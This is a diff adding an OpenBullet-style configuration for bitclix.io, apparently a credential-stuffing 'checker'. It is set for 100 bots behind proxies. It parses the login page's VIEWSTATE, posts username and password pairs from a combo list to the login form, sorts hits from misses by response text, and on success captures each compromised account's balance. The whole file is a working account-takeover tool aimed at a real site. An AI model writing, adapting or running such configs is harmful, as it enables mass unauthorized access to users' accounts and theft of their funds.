@@ -1,0 +1,68 @@
+[SETTINGS]
+{
+  "Name": "bitclix.io",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2019-07-25T07:51:14.1742698+03:00",
+  "AdditionalInfo": "",
+  "Author": "iwannasuicede",
+  "Version": "1.3.2 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://bitclix.io/login.aspx" 
+  CONTENT "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "id=\"__VIEWSTATE\" value=\"" "\" />" -> VAR "__VIEWSTATE" 
+
+REQUEST POST "https://bitclix.io/login.aspx" 
+  CONTENT "------WebKitFormBoundaryctMTSo8eKcgmGjUF\\nContent-Disposition: form-data; name=\"__EVENTTARGET\"\\n------WebKitFormBoundaryctMTSo8eKcgmGjUF\\nContent-Disposition: form-data; name=\"__EVENTARGUMENT\"\\n------WebKitFormBoundaryctMTSo8eKcgmGjUF\\nContent-Disposition: form-data; name=\"__EVENTARGUMENT\"\\n------WebKitFormBoundaryctMTSo8eKcgmGjUF\\nContent-Disposition: form-data; name=\"__VIEWSTATE\"\\n\\n<__VIEWSTATE>\\n------WebKitFormBoundaryctMTSo8eKcgmGjUF\\nContent-Disposition: form-data; name=\"__VIEWSTATEGENERATOR\"\\n\\nC2EE9ABB\\n------WebKitFormBoundaryctMTSo8eKcgmGjUF\\nContent-Disposition: form-data; name=\"ctl00$MainContentPlaceHolder$LoginAd\"\\n------WebKitFormBoundaryctMTSo8eKcgmGjUF\\nContent-Disposition: form-data; name=\"__EVENTARGUMENT5\"\\n------WebKitFormBoundaryctMTSo8eKcgmGjUF\\nContent-Disposition: form-data; name=\"ctl00$MainContentPlaceHolder$ctl00$Username\"\\n\\n<USER>\\n------WebKitFormBoundaryctMTSo8eKcgmGjUF\\nContent-Disposition: form-data; name=\"ctl00$MainContentPlaceHolder$ctl00$Password\"\\n\\n<PASS>\\n------WebKitFormBoundaryctMTSo8eKcgmGjUF\\nContent-Disposition: form-data; name=\"ctl00$MainContentPlaceHolder$ctl00$Password2\"\\n------WebKitFormBoundaryctMTSo8eKcgmGjUF\\nContent-Disposition: form-data; name=\"ctl00$MainContentPlaceHolder$ctl00$LoginButton\"\\n\\nLog In\\n------WebKitFormBoundaryctMTSo8eKcgmGjUF--" 
+  CONTENTTYPE "multipart/form-data; boundary=----WebKitFormBoundaryctMTSo8eKcgmGjUF" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "origin: https://bitclix.io" 
+  HEADER "referer: https://bitclix.io/login.aspx" 
+  HEADER "upgrade-insecure-requests: 1" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Logout" 
+  KEYCHAIN Failure OR 
+    KEY "Incorrect password(s). Please try again" 
+    KEY "can't find such user" 
+
+REQUEST GET "https://bitclix.io/user/default.aspx?afterlogin=1" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "referer: https://bitclix.io/login.aspx" 
+  HEADER "upgrade-insecure-requests: 1" 
+
+PARSE "<SOURCE>" LR "<p>" "<br />" -> CAP "BALANCE" 
+
